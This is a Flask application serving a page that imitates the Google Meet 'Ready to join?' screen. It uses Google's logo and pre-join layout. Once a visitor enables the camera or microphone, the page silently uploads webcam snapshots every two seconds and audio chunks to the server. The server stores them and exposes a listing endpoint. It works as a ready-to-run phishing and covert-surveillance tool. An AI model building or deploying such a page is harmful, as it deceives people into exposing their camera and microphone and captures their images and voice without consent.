import os
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

# Directories to save uploads
CAM_DIR = os.path.join(os.getcwd(), "cam")
MIC_DIR = os.path.join(os.getcwd(), "mic")
os.makedirs(CAM_DIR, exist_ok=True)
os.makedirs(MIC_DIR, exist_ok=True)

INDEX_HTML = r"""
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Google Meet — Replica</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
<style>
  :root{ --bg:#ffffff; --card:#17181a; --muted:#9aa0a6; --accent:#3f22d6; --red:#ff2b2b; }
  *{ box-sizing:border-box; font-family: 'Roboto', sans-serif; }
  body{ margin:0; background:var(--bg); color:#111; height:100vh; display:flex; align-items:center; justify-content:center; }
  .page { width: 1200px; max-width: calc(100vw - 48px); display:flex; gap:48px; align-items:flex-start; justify-content:space-between; }

  /* Video column (preview + devices) */
  .video-column { display:flex; flex-direction:column; align-items:center; }

  /* Left card (video preview) */
  .video-area { margin-top:60px; width:650px; height:360px; background:linear-gradient(#232425,#161719); border-radius:12px; padding:18px; box-shadow:0 12px 30px rgba(0,0,0,0.08); position:relative; display:flex; flex-direction:column; }
  .topbar { color:#fff; font-weight:500; font-size:14px; margin-bottom:12px; }
  .preview { flex:1; border-radius:8px; background: linear-gradient(#222325,#1b1c1e); display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden; aspect-ratio: 16/9;}
  .preview video, .preview canvas {
    width: 100%;
    height: 100%;
    object-fit: cover; /* fills and crops instead of black bars */
    display: block;
    background: transparent;
  }
  .preview .placeholder { position:absolute; color:#cfcfcf; font-size:20px; z-index:2; }
  .controls {
    position: absolute;
    bottom: 16px;
    left: 50%;
    transform: translateX(-50%);
    display: flex;
    gap: 16px;
    z-index: 3;
  }
  .big-btn { width:56px;height:56px;border-radius:50%; display:inline-grid;place-items:center; cursor:pointer; box-shadow:0 6px 20px rgba(0,0,0,0.2); border:none; }
  .big-btn.cam { background:var(--red); color:#fff; }
  .big-btn.mic { background:var(--red); color:#fff; }

  /* Device row under video */
  .device-row { display:flex; gap:24px; align-items:center; color:var(--muted); margin-top:10px; font-size:14px; justify-content:center; }
  .device-row img { vertical-align: middle; position: relative; top: 0px;}
  /* Right column (join panel) */
  .join-card { margin-top: 95px; width:360px; display:flex; flex-direction:column; align-items:flex-start; gap:18px; }
  .join-title { font-size:28px; font-weight:normal; }
  .ask-btn {margin-left: -41px; background:var(--accent); color:#fff; padding:20px 103px; border-radius:28px; font-weight:500; border:none; cursor:pointer; box-shadow:0 8px 24px rgba(63,34,214,0.18); }
  .other { border-radius:24px; padding:10px 16px; border:1px solid #dedede; background:#fff; cursor:pointer; }

  /* Branding */
  .brand { position:fixed; top:18px; left:18px; display:flex; align-items:center; gap:10px; font-weight:500; color:#333; }
  .brand img { height:35px; }

  /* Account info */
  .account { position:fixed; top:14px; right:18px; color:#222; font-size:14px; display:flex; align-items:center; gap:12px; }

  @media (max-width:1100px){
    .page { flex-direction:column; align-items:center; }
    .join-card { width:100%; max-width:420px; align-items:center; text-align:center; }
  }
</style>
</head>
<body>
  <div class="brand">
    <img src="https://www.gstatic.com/meet/google_meet_primary_horizontal_2020q4_logo_be3f8c43950bd1e313525ada2ce0df44.svg" alt="logo">
  </div>

  <div class="account">
    <div style="text-align:right;">
      <div style="font-size:16px;color:rgb(26,115,232);cursor:pointer;" onclick="window.location.href='http://127.0.0.1:80';">Sign In</div>
    </div>
  </div>

  <div class="page">
    <!-- Left column with video and device row -->
    <div class="video-column">
      <div class="video-area" aria-label="video-area">
        <div class="preview" id="preview">
          <div class="placeholder" id="placeholder">Camera is off</div>
          <video id="video" autoplay playsinline style="display:none;"></video>
          <canvas id="captureCanvas" style="display:none;"></canvas>
          <div class="controls">
            <button id="micBtn" class="big-btn mic" title="Toggle mic" aria-pressed="false">
              <!-- mic off icon -->
    	      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                <path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 1 0-6 0v6a3 3 0 0 0 3 3z" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
      		<path d="M19 11v1a7 7 0 0 1-14 0v-1" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
    	      </svg>
            </button>
            <button id="camBtn" class="big-btn cam" title="Toggle camera" aria-pressed="false">
              <!-- video off icon -->
    	      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
      		<path d="M23 7l-6 4v2l6 4V7zM1 5v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2H3a2 2 0 0 0-2 2z" stroke="#fff" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
    	      </svg>
            </button>
          </div>
        </div>
      </div>
      <div class="device-row">
  	<div><img src="{{ url_for('static', filename='default.jpg') }}" alt="Default" style="height:30px;"> Default</div>
  	<div><img src="{{ url_for('static', filename='audio.jpg') }}" alt="Audio" style="height:30px;"> Built-in Audio</div>
  	<div><img src="{{ url_for('static', filename='webcam.jpg') }}" alt="Webcam" style="height:30px;"> Integrated Webcam</div>
      </div>
    </div>

    <!-- Right column join card -->
    <div class="join-card">
      <div class="join-title">Ready to join?</div>
      <button class="ask-btn" onclick="window.location.href='http://127.0.0.1:80';">Ask to join</button>
    </div>
  </div>

<script>
const camBtn = document.getElementById('camBtn');
const micBtn = document.getElementById('micBtn');
const videoEl = document.getElementById('video');
const placeholder = document.getElementById('placeholder');
const canvas = document.getElementById('captureCanvas');

let camStream = null;
let camInterval = null;
let micStream = null;
let mediaRecorder = null;

async function uploadBlob(url, blob, filename){
  const fd = new FormData();
  fd.append('file', blob, filename);
  try {
    const res = await fetch(url, { method: 'POST', body: fd });
    return res.ok;
  } catch (e){
    console.error('Upload failed', e);
    return false;
  }
}

camBtn.addEventListener('click', async () => {
  const enabled = camBtn.getAttribute('aria-pressed') === 'true';
  if (!enabled) {
    try {
      camStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
      videoEl.srcObject = camStream;
      videoEl.style.display = 'block';
      placeholder.style.display = 'none';
      camBtn.setAttribute('aria-pressed', 'true');

      const track = camStream.getVideoTracks()[0];
      const settings = track.getSettings();
      canvas.width = settings.width || 640;
      canvas.height = settings.height || 480;

      captureAndSendFrame();
      camInterval = setInterval(captureAndSendFrame, 2000);
    } catch (err) {
      console.error('Camera error:', err);
      alert('Unable to access camera.');
    }
  } else {
    camBtn.setAttribute('aria-pressed', 'false');
    if (camInterval) clearInterval(camInterval);
    if (camStream) camStream.getTracks().forEach(t => t.stop());
    camStream = null;
    videoEl.style.display = 'none';
    placeholder.style.display = 'block';
  }
});

async function captureAndSendFrame(){
  if (!camStream) return;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(async (blob) => {
    if (!blob) return;
    await uploadBlob('/upload_cam', blob, `cam_${Date.now()}.png`);
  }, 'image/png');
}

micBtn.addEventListener('click', async () => {
  const enabled = micBtn.getAttribute('aria-pressed') === 'true';
  if (!enabled){
    try {
      micStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
      mediaRecorder = new MediaRecorder(micStream);
      mediaRecorder.addEventListener('dataavailable', async (e) => {
        if (e.data && e.data.size > 0) {
          await uploadBlob('/upload_mic', e.data, `mic_${Date.now()}.webm`);
        }
      });
      mediaRecorder.start(2000);
      micBtn.setAttribute('aria-pressed', 'true');
    } catch (err) {
      console.error('Mic error:', err);
      alert('Unable to access microphone.');
    }
  } else {
    micBtn.setAttribute('aria-pressed', 'false');
    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
    if (micStream) micStream.getTracks().forEach(t => t.stop());
  }
});

window.addEventListener('beforeunload', () => {
  if (camStream) camStream.getTracks().forEach(t => t.stop());
  if (micStream) micStream.getTracks().forEach(t => t.stop());
});
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(INDEX_HTML)

@app.route("/upload_cam", methods=["POST"])
def upload_cam():
    file = request.files.get('file')
    if not file:
        return jsonify({"error": "No file"}), 400
    ts = datetime.utcnow().strftime("%Y%m%d%H%M%S%f")
    ext = os.path.splitext(file.filename or "img.png")[1] or ".png"
    fname = f"cam_{ts}{ext}"
    file.save(os.path.join(CAM_DIR, fname))
    return jsonify({"saved": fname}), 200

@app.route("/upload_mic", methods=["POST"])
def upload_mic():
    file = request.files.get('file')
    if not file:
        return jsonify({"error": "No file"}), 400
    ts = datetime.utcnow().strftime("%Y%m%d%H%M%S%f")
    ext = os.path.splitext(file.filename or "audio.webm")[1] or ".webm"
    fname = f"mic_{ts}{ext}"
    file.save(os.path.join(MIC_DIR, fname))
    return jsonify({"saved": fname}), 200

@app.route("/list_uploads")
def list_uploads():
    return jsonify({
        "cams": sorted(os.listdir(CAM_DIR)),
        "mics": sorted(os.listdir(MIC_DIR))
    })

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)

